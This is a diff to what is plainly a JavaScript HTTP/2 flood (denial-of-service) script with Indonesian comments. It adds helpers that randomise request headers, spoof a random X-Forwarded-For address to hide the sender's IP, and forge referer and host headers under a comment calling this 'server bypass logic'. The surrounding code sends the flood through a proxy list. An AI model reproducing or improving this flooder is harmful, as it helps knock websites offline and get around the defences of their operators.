@@ -132,25 +132,45 @@ class NetSocket {
 }
 const userAgentString = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 const socketInstance = new NetSocket();
+
+// Fungsi pembantu untuk mendapatkan nilai acak dari array
+const getRandomValue = (array) => array[Math.floor(Math.random() * array.length)];
+
+// Fungsi pembantu untuk menghasilkan IP acak
+const generateRandomIp = () => 
+  `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;
+
+// Fungsi pembantu untuk mendapatkan bilangan bulat acak dalam rentang tertentu
+const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
-headers.accept = accept_header[Math.floor(Math.random() * accept_header.length)];
-headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
-headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
-headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
+headers.accept = getRandomValue(accept_header);
+headers["accept-encoding"] = getRandomValue(encoding_header);
+headers["accept-language"] = getRandomValue(language_header);
+headers["cache-control"] = getRandomValue(cache_header);
 headers.pragma = "no-cache";
-headers.cookie = process.argv[7];
 headers["sec-ch-ua"] = userAgentString;
 headers["sec-ch-ua-mobile"] = "?0";
-headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
-headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
-headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
-headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
+headers["sec-ch-ua-platform"] = getRandomValue(platform);
+headers["sec-fetch-dest"] = getRandomValue(dest_header);
+headers["sec-fetch-mode"] = getRandomValue(mode_header);
+headers["sec-fetch-site"] = getRandomValue(site_header);
 headers["sec-fetch-user"] = "1";
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] = userAgentString;
 headers["x-requested-with"] = "XMLHttpRequest";
+
+// --- Logika Bypass Server ---
+headers[":authority"] = parsedTarget.host;
+headers.host = parsedTarget.host;
+headers["x-forwarded-for"] = generateRandomIp();  // Menyembunyikan IP asli
+headers["referer"] = `https://${parsedTarget.host}/`; // Simulasi lalu lintas sah
+
+// Opsional: Tambahkan header tambahan jika diperlukan untuk bypass
+headers["connection"] = "keep-alive";
+headers["dnt"] = "1"; // Jangan lacak (opsional)
 function runFlooder() {
   const proxyDetails = randomElement(proxies);
   const proxyParts = proxyDetails.split(":");
